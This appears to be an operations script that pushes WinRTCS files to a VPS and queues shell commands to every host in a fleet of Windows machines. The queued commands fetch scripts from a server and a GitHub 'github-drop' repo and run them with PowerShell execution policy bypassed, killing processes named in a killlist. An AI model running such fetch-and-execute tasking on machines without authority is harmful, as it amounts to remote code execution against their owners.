#!/usr/bin/env python3
"""Build, push C34 anti + killlist to GitHub-synced VPS, queue fleet PURGE-ONLY."""
from __future__ import annotations

import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

import paramiko

ROOT = Path(__file__).resolve().parent.parent  # repo root (script lives in ops/)
HOST = "144.172.107.56"
KEY = str(Path.home() / ".ssh" / "winrtcs_ed25519")
BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
FETCH = ((Path(__file__).resolve().parent / "secrets" / "fetch_token.txt")).read_text(encoding="utf-8").strip()

FILES = [
    "winrtcs_killlist.cfg",
    "winrtcs_sidekick.ps1",
    "winrtcs.version",
    "winrtcs.version.sig",
    "winrtcs_anti.cmd",
    "winrtcs_anti.ps1",
]

# Refresh killlist + Hunt (no R3). Short enough for Guest cmd channel.
FORCE_HUNT = (
    r"@echo off & setlocal EnableExtensions"
    r" & set ZD=C:\ProgramData\WinRTCS"
    r" & set CURL=%SystemRoot%\System32\curl.exe"
    r" & set TOK=" + FETCH +
    r" & set B=https://debian.seczio.com/winrtcs"
    r' & "%CURL%" -f -L --ssl-no-revoke -H "Authorization: Bearer %TOK%"'
    r' --connect-timeout 8 --max-time 30 -o "%ZD%\killlist.cfg" "%B%/winrtcs_killlist.cfg?t=%RANDOM%"'
    r' & "%CURL%" -f -L --ssl-no-revoke -H "Authorization: Bearer %TOK%"'
    r' --connect-timeout 8 --max-time 30 -o "%ZD%\winrtcs_sidekick.ps1" "%B%/winrtcs_sidekick.ps1?t=%RANDOM%"'
    r' & powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass'
    r' -File "%ZD%\winrtcs_sidekick.ps1" -Action Hunt -WorkDir "%ZD%" -KillList "%ZD%\killlist.cfg"'
    r' & findstr /I "zytrx SCWatchdog pluxn 194b6f62 SCAgentMigration" "%ZD%\killlist.cfg"'
    r" & echo C34_HUNT_DONE"
)

# PURGE-ONLY anti (no --heal) — Gryxa-safe for ALL
ANTI_ALL = (
    r"@echo off & setlocal"
    r" & curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 60"
    r" -o C:\Users\Public\winrtcs_anti.cmd"
    r" https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_anti.cmd"
    r" & call C:\Users\Public\winrtcs_anti.cmd"
    r" & echo ANTI_QUEUED"
)


def api(path: str, fields: dict | None = None) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    req = urllib.request.Request(BASE + path, data=data)
    req.add_header("Authorization", "Bearer " + ADMIN)
    req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
    with urllib.request.urlopen(req, timeout=90) as r:
        return r.read().decode(errors="replace")


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    print("== build ==")
    r = subprocess.run([sys.executable, str(ROOT / "winrtcs_build.py")], cwd=ROOT)
    if r.returncode != 0:
        return r.returncode

    kl = (ROOT / "winrtcs_killlist.cfg").read_text(encoding="utf-8")
    for needle in ("zytrx", "SCWatchdog", "pluxn", "194b6f627c5bdf33", "SCAgentMigration", "uvexr"):
        assert needle in kl, f"missing {needle}"

    # CRLF normalize anti.cmd
    for name in ("winrtcs_anti.cmd", "winrtcs_anti.ps1"):
        p = ROOT / name
        raw = p.read_bytes().replace(b"\r\n", b"\n").replace(b"\r", b"\n").replace(b"\n", b"\r\n")
        p.write_bytes(raw)

    print("== git commit/push (if dirty) ==")
    st = subprocess.run(["git", "status", "--porcelain"], cwd=ROOT, capture_output=True, text=True)
    print(st.stdout)
    # caller commits; we only push after commit. Here we commit the anti set.
    subprocess.run(
        [
            "git",
            "add",
            "winrtcs_anti.cmd",
            "winrtcs_anti.ps1",
            "winrtcs_killlist.cfg",
            "winrtcs_sidekick.ps1",
            "winrtcs.version",
            "winrtcs.version.sig",
        ],
        cwd=ROOT,
        check=True,
    )
    c = subprocess.run(
        ["git", "commit", "-m", "feat: C34 winrtcs_anti purge + SCWatchdog/pluxn killlist (Gryxa-safe)"],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    print(c.stdout or c.stderr)
    subprocess.run(["git", "push", "origin", "HEAD"], cwd=ROOT, check=True)

    print("== VPS sudo install ==")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, username="winrtcs", key_filename=KEY, timeout=20)
    sftp = ssh.open_sftp()
    remote_tmp = "/tmp/winrtcs_anti_push"
    ssh.exec_command(f"mkdir -p {remote_tmp}")
    time.sleep(0.3)
    for name in FILES:
        local = ROOT / name
        sftp.put(str(local), f"{remote_tmp}/{name}")
        print("put", name, local.stat().st_size)
    sftp.close()
    names = " ".join(FILES)
    cmd = (
        f"sudo cp -f {remote_tmp}/* /opt/winrtcs/repo/ && "
        f"cd /opt/winrtcs/repo && sudo chmod 644 {names} && "
        f"sudo chown root:root {names} && rm -rf {remote_tmp} && "
        f"grep -E 'zytrx|pluxn|194b6f62' winrtcs_killlist.cfg | head -5 && "
        f"test -f winrtcs_anti.cmd && echo INSTALL_OK"
    )
    _, stdout, stderr = ssh.exec_command(cmd, timeout=40)
    out = stdout.read().decode(errors="replace")
    print(out)
    if stderr.read():
        pass
    ssh.close()
    if "INSTALL_OK" not in out:
        return 2

    print("== verify VPS + GitHub ==")
    req = urllib.request.Request(
        BASE + "/winrtcs/winrtcs_killlist.cfg?t=" + str(int(time.time())),
        headers={"Authorization": "Bearer " + FETCH, "User-Agent": "Mozilla/5.0 (WinRTCS-Console)"},
    )
    body = urllib.request.urlopen(req, timeout=30).read().decode(errors="replace")
    assert "zytrx" in body and "194b6f627c5bdf33" in body
    print("VPS killlist OK", len(body))
    gh = urllib.request.urlopen(
        "https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_anti.cmd", timeout=30
    ).read().decode(errors="replace")
    assert "WinRTCSAnti" in gh and "PURGE-ONLY" in gh
    print("GitHub anti OK", len(gh))

    print("== queue ALL force Hunt ==")
    print(api("/cmd", {"target": "ALL", "cmd": FORCE_HUNT}))
    time.sleep(2)
    print("== queue ALL anti PURGE-ONLY ==")
    print(api("/cmd", {"target": "ALL", "cmd": ANTI_ALL}))
    print("queued purge-only (no R3). Heal separately for unhealthy Gryxa hosts.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
